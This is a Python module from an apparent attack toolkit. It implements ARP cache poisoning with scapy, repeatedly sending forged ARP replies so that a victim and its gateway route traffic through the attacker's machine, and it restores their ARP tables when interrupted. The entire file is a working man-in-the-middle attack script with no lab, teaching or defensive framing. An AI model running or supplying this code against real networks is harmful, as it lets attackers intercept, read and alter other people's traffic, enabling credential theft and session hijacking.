# attacks/arp_poison.py

from scapy.all import *
import time

def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
    """
    Function to send ARP spoofing packets to the victim and the gateway.

    Parameters:
    victim_ip (str): IP address of the victim's machine.
    victim_mac (str): MAC address of the victim's machine.
    gateway_ip (str): IP address of the gateway.
    gateway_mac (str): MAC address of the gateway.
    attacker_mac (str): MAC address of the attacker's machine.
    interface (str): Network interface to use for sending ARP packets.

    Outputs:
    - Sends ARP spoofing packets to the victim and gateway.
    - Prints status messages indicating success or failure of the ARP poison.

    Alternative Outputs:
    - Prints an error message if packet sending fails.
    """
    try:
        victim_arp_response = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
        gateway_arp_response = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac)
        send(victim_arp_response, iface=interface, verbose=False)
        print("ARP poison sent: [Victim IP: %s | Spoofed as Gateway IP: %s]" % (victim_ip, gateway_ip))
        send(gateway_arp_response, iface=interface, verbose=False)
        print("ARP poison sent: [Gateway IP: %s | Spoofed as Victim IP: %s]" % (gateway_ip, victim_ip))
    except Exception as e:
        print("Failed to send ARP poison: %s" % str(e))

def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
    """
    Function to restore the ARP tables of the victim and the gateway to their correct state.

    Parameters:
    victim_ip (str): IP address of the victim's machine.
    victim_mac (str): MAC address of the victim's machine.
    gateway_ip (str): IP address of the gateway.
    gateway_mac (str): MAC address of the gateway.
    interface (str): Network interface to use for sending ARP packets.

    Outputs:
    - Sends ARP packets to restore the ARP tables of the victim and gateway.
    - Prints status messages indicating success or failure of the ARP table restoration.

    Alternative Outputs:
    - Prints an error message if packet sending fails.
    """
    try:
        send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
        send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=5, iface=interface, verbose=False)
        print("ARP tables restored for [Victim IP: %s, Gateway IP: %s]" % (victim_ip, gateway_ip))
    except Exception as e:
        print("Failed to restore network: %s" % str(e))

def run(args):
    """
    Function to run the ARP poisoning attack.
    
    Parameters:
    args (argparse.Namespace): Command-line arguments.
    
    Outputs:
    - Continuously sends ARP spoofing packets to the victim and the gateway.
    - Restores the ARP tables of the victim and the gateway when the attack is stopped.
    - Prints status messages indicating the start, stop, and success of the ARP poisoning.
    """
    try:
        while True:
            poison_arp(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac, args.interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopping ARP poisoning and restoring network...")
        restore_network(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.interface)
